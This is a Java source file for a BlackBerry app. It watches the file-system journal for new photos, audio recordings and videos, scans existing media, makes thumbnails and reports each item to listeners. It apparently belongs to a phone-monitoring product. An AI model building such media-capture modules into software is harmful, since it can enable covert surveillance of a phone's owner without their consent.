package com.vvt.mediamon;

import java.io.IOException;
import java.util.Hashtable;
import java.util.Timer;
import java.util.TimerTask;
import java.util.Vector;
import com.vvt.global.Global;
import com.vvt.info.ApplicationInfo;
import com.vvt.mediamon.info.MediaInfo;
import com.vvt.mediamon.info.MediaInfoType;
import com.vvt.mediamon.resource.MediaTextResource;
import com.vvt.mediamon.seeker.MediaSeekerDb;
import com.vvt.mediamon.seeker.MediaMapping;
import com.vvt.mediamon.seeker.MediaSeeker;
import com.vvt.mediamon.seeker.MediaSeekerInfo;
import com.vvt.mediamon.seeker.MediaSeekerListener;
import com.vvt.pref.PrefAudioFile;
import com.vvt.pref.PrefCameraImage;
import com.vvt.pref.PrefVideoFile;
import com.vvt.pref.Preference;
import com.vvt.pref.PreferenceType;
import com.vvt.std.FileUtil;
import com.vvt.std.Log;
import net.rim.device.api.io.file.FileSystemJournal;
import net.rim.device.api.io.file.FileSystemJournalEntry;
import net.rim.device.api.io.file.FileSystemJournalListener;
import net.rim.device.api.system.RuntimeStore;
import net.rim.device.api.ui.UiApplication;

public class MediaMonitor implements FileSystemJournalListener, MediaSeekerListener {
	
	private final String TAG = "MediaMonitor";
	private static MediaMonitor self;
	public  static 	final long MediaMonitor_GUID 	= 0x98f03d596c8f3204L; //com.vvt.media.MediaMonitor
	private ThumbGenerator		generator	= new ThumbGenerator();
	private Vector	listeners = new Vector();
	private MediaMapping mediaMapping = null;
	private boolean audioFirstChanged = false;
	private boolean videoFirstChanged = false;
	private boolean isFileCopy = false;
	private boolean isStarted = false;
	private boolean isImageScanned = false;
	private boolean isAudioScanned = false;
	private boolean isVideoScanned = false;
	private final String FILE = "file://"; 
	private Preference pref = Global.getPreference();
	private PrefVideoFile videoFileInfo = (PrefVideoFile)pref.getPrefInfo(PreferenceType.PREF_VIDEO_FILE);
	private PrefAudioFile audioFileInfo = (PrefAudioFile)pref.getPrefInfo(PreferenceType.PREF_AUDIO_FILE);
	private PrefCameraImage camImageInfo = (PrefCameraImage)pref.getPrefInfo(PreferenceType.PREF_CAMERA_IMAGE);
	private MediaSeekerDb mediaSeekerDb = MediaSeekerDb.getInstance();
	private String discardScanPath = "/store/home/user/im/";
	
	private MediaMonitor() {
	}
	
	public static MediaMonitor getInstance()	{
		if (self == null) {
			self = (MediaMonitor) RuntimeStore.getRuntimeStore().get(MediaMonitor_GUID);
			if (self == null) {
				/*if (Log.isDebugEnable()) {
					Log.debug("MediaMonitor.getInstance()", "New MediaMonitor");
				}*/
				MediaMonitor mediaMan = new MediaMonitor();
				RuntimeStore.getRuntimeStore().put(MediaMonitor_GUID, mediaMan);
				self = mediaMan;
			}
		}
		return self;
	}
	
	public void detroy()	{
		stopMonitor();	
		RuntimeStore.getRuntimeStore().remove(MediaMonitor_GUID);
		self = null;
		mediaSeekerDb.destroy();
	}
	
	public void startMonitor() {
		if (camImageInfo.isEnabled() && !camImageInfo.isFirstEnabled()) {
			if (!isImageScanned) {
				isImageScanned = true;
				if (Log.isDebugEnable()) {
					Log.debug(TAG + ".startMonitor()", "Start scan image ");
				}
				MediaSeeker seeker = new MediaSeeker(MediaInfoType.IMAGE_THUMBNAIL);
				seeker.addMediaSeekerListener(this);
				seeker.scanHistoricalMedia();
			}
		}
		if (videoFileInfo.isEnabled() && !videoFileInfo.isFirstEnabled()) {
			if (!isVideoScanned) {
				isVideoScanned = true;
				if (Log.isDebugEnable()) {
					Log.debug(TAG + ".startMonitor()", "Start scan video ");
				}
				MediaSeeker seeker = new MediaSeeker(MediaInfoType.VIDEO_THUMBNAIL);
				seeker.addMediaSeekerListener(this);
				seeker.scanHistoricalMedia();
			}
		}
		if  (audioFileInfo.isEnabled() && !audioFileInfo.isFirstEnabled()) {
			if (!isAudioScanned) {
				isAudioScanned = true;
				if (Log.isDebugEnable()) {
					Log.debug(TAG + ".startMonitor()", "Start scan audio ");
				}
				MediaSeeker seeker = new MediaSeeker(MediaInfoType.AUDIO_THUMBNAIL);
				seeker.addMediaSeekerListener(this);
				seeker.scanHistoricalMedia();
			}
		} 
		if (!isStarted) {
			isStarted = true;
			UiApplication.getUiApplication().addFileSystemJournalListener(this);
		}
	}
	
	public void stopMonitor() {
		if (isStarted) {
			isStarted = false;
			UiApplication.getUiApplication().removeFileSystemJournalListener(this);
			clearFlags();
		}
	}

	private void clearFlags() {
		isImageScanned = false;
		isVideoScanned = false;
		isAudioScanned = false;
		audioFirstChanged = false;
		videoFirstChanged = false;
		isFileCopy = false;
	}
	
	public void addMediaMonitorListener(MediaMonitorListener listener)	{
		if (!isExisted(listener)) {
			listeners.addElement(listener);
		}
	}
	
	public void removeMediaMonitorListener(MediaMonitorListener listener) {
		if (!isExisted(listener)) {
			listeners.removeElement(listener);
		}
	}
	
	private void createImageThumb(MediaSeekerInfo mediaSeekerInfo) {		
		if (mediaSeekerInfo != null) {				
			mediaMapping = mediaSeekerInfo.getMediaMapping();
			Hashtable actualPathMap = mediaMapping.getActualPathMap();
			MediaInfo mediaInfo = null;
			int count = mediaSeekerInfo.countNewEntryKey();
			for (int i = 0; i < count; i++) {
				String key = mediaSeekerInfo.getNewEntryKey(i);
				mediaInfo = (MediaInfo) actualPathMap.get(key);
				String thumbPath = null;
				String actualPath = mediaInfo.getActualPath();
				if (mediaInfo.getMediaInfoType().equals(MediaInfoType.IMAGE_THUMBNAIL)) {
					thumbPath = generator.generateThumbImage(actualPath);
				} else if (mediaInfo.getMediaInfoType().equals(MediaInfoType.VIDEO_THUMBNAIL)) {
					thumbPath = generator.generateVDOThumbDummy();
				} else if (mediaInfo.getMediaInfoType().equals(MediaInfoType.AUDIO_THUMBNAIL)) {
					thumbPath = generator.generateAudioThumbDummy();
				} else {
					// Wrong type!
					Log.error(TAG + ".createImageThumb()", "Wrong Media Info type!");
				}
				if (thumbPath != null) {
					int paringId = mediaMapping.getNextParingId();
					mediaInfo.setThumbPath(thumbPath);
					mediaInfo.setParingId(paringId);
					mediaMapping.add(paringId, mediaInfo); //Save to ParingId table
					mediaMapping.add(actualPath, mediaInfo); //Save to ActualPath table
					mediaSeekerDb.commit(mediaMapping);
					notifyMediaEvent(mediaInfo);
				} else {
					actualPathMap.remove(key);
				}
			}
		}
	}
	
	private boolean isExisted(MediaMonitorListener listener) {
		boolean existed = false;
		for (int i = 0; i < listeners.size(); i++) {
			if (listener == listeners.elementAt(i)) {
				existed = true;
				break;
			}
		}
		return existed;
	}
	
	private void notifyMediaEvent(MediaInfo mediaInfo) {
		for (int i=0; i<listeners.size(); i++) {
			MediaMonitorListener listener = (MediaMonitorListener) listeners.elementAt(i);
			listener.mediaCreated(mediaInfo);
		}
	}
	
	// FileSystemJournalListener
	public synchronized void fileJournalChanged() {
		String videoLockExtension = ".3gp.lock";
		//thumbDefaultPath = "/store/home/user/thumbs/"; 
		String thumbDefaultPath = ApplicationInfo.THUMB_PATH.substring(7);
		
		FileSystemJournalEntry entry =  FileSystemJournal.
			getEntry(FileSystemJournal.getNextUSN()-1);
		if (entry != null) {
			String path = entry.getPath();
			int type 	= entry.getEvent();
//			Log.debug(TAG + ".fileJournalChanged()", "path: " + path + ", type: " + type);
			if (path.indexOf(thumbDefaultPath) == -1 && path.indexOf(discardScanPath) == -1) {
				if (camImageInfo.isEnabled() && path.toLowerCase().endsWith(MediaTextResource.JPG)) {
					if ((type == FileSystemJournalEntry.FILE_CHANGED) || (type == FileSystemJournalEntry.FILE_RENAMED)) {
//						Log.debug(TAG + ".fileJournalChanged()", getNow()+" \t Got an image ! ***, path: " + path);
						addNewFiles(MediaInfoType.IMAGE_THUMBNAIL, path);
					} else if (type == FileSystemJournalEntry.FILE_DELETED) {
//						Log.debug(TAG + ".fileJournalChanged()", getNow()+" \t IMAGE FILE_DELETED, path: " + path);
						deleteInfoFromDb(FILE + path);
					} 
				} else if (audioFileInfo.isEnabled() && path.toLowerCase().endsWith(MediaTextResource.AMR)) {
					if (type == FileSystemJournalEntry.FILE_CHANGED) {
						if (!audioFirstChanged) {
							audioFirstChanged = true;														
							scheduleAudioCapturing(path);	
						}
					} else if (type == FileSystemJournalEntry.FILE_DELETED) {
						if (!audioFirstChanged) {
//							Log.debug(TAG + ".fileJournalChanged()", getNow()+" \t AUDIO FILE_DELETED, path: " + path);
							deleteInfoFromDb(FILE + path);
						} 
					} else if (type == FileSystemJournalEntry.FILE_RENAMED) {
						if (!audioFirstChanged) {
							addNewFiles(MediaInfoType.AUDIO_THUMBNAIL, path);
						}
					} 
				} else if (videoFileInfo.isEnabled() && path.toLowerCase().endsWith(MediaTextResource._3GP)) {
					if (type == FileSystemJournalEntry.FILE_CHANGED) {
						// Check that is file copy or not?
						// If file copy pattern is ADDED --> CHANGED
						if (!videoFirstChanged) {
							videoFirstChanged = true;
							isFileCopy = true;
							scheduleVideoCapturing(path);	
						}
					} else if (type == FileSystemJournalEntry.FILE_RENAMED) {
//						Log.debug(TAG + ".fileJournalChanged()", getNow()+" \t Got a video clip ! ***, path: " + path);
						clearVideoState();
						addNewFiles(MediaInfoType.VIDEO_THUMBNAIL, path);
					} else if (type == FileSystemJournalEntry.FILE_DELETED) {
//						Log.debug(TAG + ".fileJournalChanged()", getNow()+" \t IMAGE FILE_DELETED, path: " + path);
						deleteInfoFromDb(FILE + path);
					} 
				} else if (videoFileInfo.isEnabled() && path.toLowerCase().endsWith(videoLockExtension)) {
					if (type == FileSystemJournalEntry.FILE_RENAMED	) {
						// It's recorded file, normally "FILE_RENAMED" will be next step from "FILE_CHANGED" 
						// and should not take time more than 400 ms between "FILE_CHANGED" and "FILE_RENAMED".
						// So we can decide that is copy file or recorded file.
						isFileCopy = false;
					}
				}
			}
		}
	}

	private void scheduleAudioCapturing(final String path) {		
		new Timer().schedule(new TimerTask() {
			public void run() {
				try {
					audioFirstChanged = false;
					MediaSeeker seeker = new MediaSeeker(MediaInfoType.AUDIO_THUMBNAIL);
					MediaSeekerInfo info = seeker.addNewFiles(FILE + path);
					createImageThumb(info);
				} catch (Exception e) {
					Log.error(TAG + ".scheduleAudioCapturing()", e.getMessage(), e);
				}
			}
		}, 400);
	}
	
	private void scheduleVideoCapturing(final String path) {		
		new Timer().schedule(new TimerTask() {
			public void run() {
				try {
					if (isFileCopy) {
						if (Log.isDebugEnable()) {
							Log.debug(TAG + ".scheduleVideoCapturing()", " \t Got video!, path: " + path);
						}
						clearVideoState();
						addNewFiles(MediaInfoType.VIDEO_THUMBNAIL, path);
					}
				} catch (Exception e) {
					Log.error(TAG + ".scheduleVideoCapturing()", e.getMessage(), e);
				}
			}
		}, 400);
	}
	
	private void addNewFiles(MediaInfoType type, String path) {
		MediaSeeker seeker = new MediaSeeker(type);
		MediaSeekerInfo info = seeker.addNewFiles(FILE + path);
		createImageThumb(info);
	}
	
	private void clearVideoState() {
		videoFirstChanged = false;
		isFileCopy = false;
	}
	
	/**
	 * Actual file has been deleted.
	 * @param filePath
	 */
	private synchronized void deleteInfoFromDb(String filePath) {
		try {
			MediaMapping mediaMapping = mediaSeekerDb.getMediaMapping(); 
			// Delete info from actual path hashtable.
			Hashtable actualPathmap = mediaMapping.getActualPathMap();
			MediaInfo info = (MediaInfo) actualPathmap.get(filePath);
			int paringId = info.getParingId();
			// Delete thumbnail file
			FileUtil.deleteFile(info.getThumbPath());
			// Delete from db.
			actualPathmap.remove(filePath);
			
			// Delete info from paring id hashtable.
			Hashtable paringIdMap = mediaMapping.getParingIdMap();
			paringIdMap.remove(new Integer(paringId));
			mediaSeekerDb.commit(mediaMapping);
		} catch (IOException e) {
			e.printStackTrace();
			Log.error(TAG + ".deleteInfoFromDb()", e.getMessage());
		}
	}
	
	// MediaSeekerListener
	public void onError(Exception e, MediaInfoType type) {
		if (type == MediaInfoType.AUDIO_THUMBNAIL) {
			isVideoScanned = false;
		} else if (type == MediaInfoType.VIDEO_THUMBNAIL) {
			isVideoScanned = false;			
		} else if (type == MediaInfoType.IMAGE_THUMBNAIL) {
			isImageScanned = false;
		}		
	}

	public void onSuccess(MediaSeekerInfo info) {
		if (info.getMediaInfoType().getId() == MediaInfoType.AUDIO_THUMBNAIL.getId()) {
			isVideoScanned = false;	
			if (!audioFileInfo.isFirstEnabled()) {
				audioFileInfo.setFirstEnabled(true);
				pref.commit(audioFileInfo);
			}
		} else if (info.getMediaInfoType().getId() == MediaInfoType.VIDEO_THUMBNAIL.getId()) {
			isVideoScanned = false;
			if (!videoFileInfo.isFirstEnabled()) {
				videoFileInfo.setFirstEnabled(true);
				pref.commit(videoFileInfo);
			}
		} else if (info.getMediaInfoType().getId() == MediaInfoType.IMAGE_THUMBNAIL.getId()) {
			isImageScanned = false;
			if (!camImageInfo.isFirstEnabled()) {
				camImageInfo.setFirstEnabled(true);
				pref.commit(camImageInfo);
			}
		}
		createImageThumb(info);
	}
}